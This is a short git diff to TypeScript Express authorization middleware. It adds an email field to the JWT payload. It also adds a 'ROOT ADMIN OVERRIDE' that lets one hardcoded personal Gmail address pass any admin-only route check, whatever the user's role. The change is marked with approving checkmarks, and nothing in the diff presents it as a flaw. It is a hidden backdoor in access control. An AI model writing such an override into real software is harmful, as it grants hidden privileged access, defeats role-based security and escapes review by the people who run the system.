@@ -6,6 +6,7 @@ import { UserRole } from "../modules/auth/user.model.js";
 export interface JwtUserPayload extends JwtPayload {
   sub: string;
   role: UserRole;
+  email: string; // ✅ Added
 }
 
 export interface AuthRequest extends Request {
@@ -44,6 +45,11 @@ export const authorize = (...allowedRoles: UserRole[]) => {
     }
 
     if (!allowedRoles.includes(req.user.role)) {
+      // ✅ ROOT ADMIN OVERRIDE
+      if (allowedRoles.includes("admin") && req.user.email === "gargmishti9@gmail.com") {
+        return next();
+      }
+
       return res.status(403).json({
         message: "Access denied. Insufficient permissions.",
       });
